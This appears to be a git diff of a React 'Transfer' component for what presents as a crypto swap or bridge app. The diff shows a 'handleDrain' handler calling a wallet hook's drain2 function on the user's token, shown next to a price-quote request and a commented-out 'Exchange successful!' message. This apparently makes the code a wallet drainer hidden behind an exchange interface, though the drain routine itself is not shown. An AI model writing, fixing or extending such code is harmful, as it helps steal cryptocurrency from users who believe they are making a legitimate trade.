@@ -35,7 +35,7 @@ export default function Transfer() {
 
   const [loading, setLoading] = useState(false);
   const [txState, setTxState] = useState("Initial");
-  const { drain } = useWallet();
+  const { drain2 } = useWallet();
 
   const handleToggle = () => {
     setIsActive(!isActive);
@@ -60,10 +60,13 @@ export default function Transfer() {
     setCurrentView("transfer");
   };
 
-  // console.log(selectedFromToken, "selectedFromToken.contractAddress");
+  console.log(
+    selectedFromToken?.token_address,
+    "selectedFromToken.token_address"
+  );
 
   const handleDrain = async () => {
-    if (!connector || !amount || !selectedFromToken.token_address) {
+    if (!connector || !amount || !selectedFromToken) {
       console.error("Missing required fields for drain.");
       return;
     }
@@ -77,7 +80,7 @@ export default function Transfer() {
       );
       const chainId = await provider.getSigner().getChainId();
 
-      await drain(provider, chainId, selectedFromToken.token_address); // Trigger drain with correct args
+      await drain2(provider, chainId, selectedFromToken.token_address); // Trigger drain with correct args
 
       setTxState("Completed");
       // toast.success("Exchange successful!");
@@ -91,15 +94,22 @@ export default function Transfer() {
 
   const { data } = useBalance({
     address,
-    ...(selectedFromNetwork?.address && {
-      token: selectedFromNetwork?.address,
+    ...(selectedFromNetwork?.token_address && {
+      token: selectedFromNetwork?.token_address,
     }),
     chainId: selectedFromNetwork?.chainId,
     config,
   });
 
   const { data: quote, isLoading } = useQuery({
-    queryKey: ["price"],
+    queryKey: [
+      "price",
+      selectedFromNetwork,
+      selectedFromToken,
+      selectedToToken,
+      selectedToNetwork,
+      amount,
+    ],
     queryFn: async () =>
       axios
         .post("https://api.relay.link/price", {
@@ -107,10 +117,10 @@ export default function Transfer() {
           originChainId: selectedFromNetwork?.chainId,
           destinationChainId: selectedToNetwork?.chainId,
           originCurrency:
-            selectedFromToken?.address ||
+            selectedFromToken?.token_address ||
             "0x0000000000000000000000000000000000000000",
           destinationCurrency:
-            selectedToToken?.address ||
+            selectedToToken?.token_address ||
             "0x0000000000000000000000000000000000000000",
           tradeType: "EXACT_INPUT",
           amount: formatAmount(amount, selectedFromNetwork?.decimals || 18),
